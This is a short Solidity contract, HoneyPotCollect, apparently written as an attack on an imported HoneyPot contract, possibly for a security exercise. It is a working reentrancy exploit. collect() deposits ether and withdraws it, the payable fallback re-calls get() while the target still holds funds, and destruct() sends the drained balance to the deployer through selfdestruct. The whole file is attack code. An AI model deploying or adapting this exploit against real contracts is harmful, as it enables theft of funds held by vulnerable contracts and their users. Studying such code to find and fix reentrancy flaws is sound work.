pragma solidity ^0.4.18;

import './HoneyPot.sol';

contract HoneyPotCollect {
    HoneyPot public honeypot;
    address owner;

    function HoneyPotCollect(address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
        owner = msg.sender;
    }

    function () public payable {
        if (honeypot.balance >= msg.value) {
            honeypot.get();   
        }
    }

    function collect() public payable {
        honeypot.put.value(msg.value)();
        honeypot.get();
    }

    function destruct() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}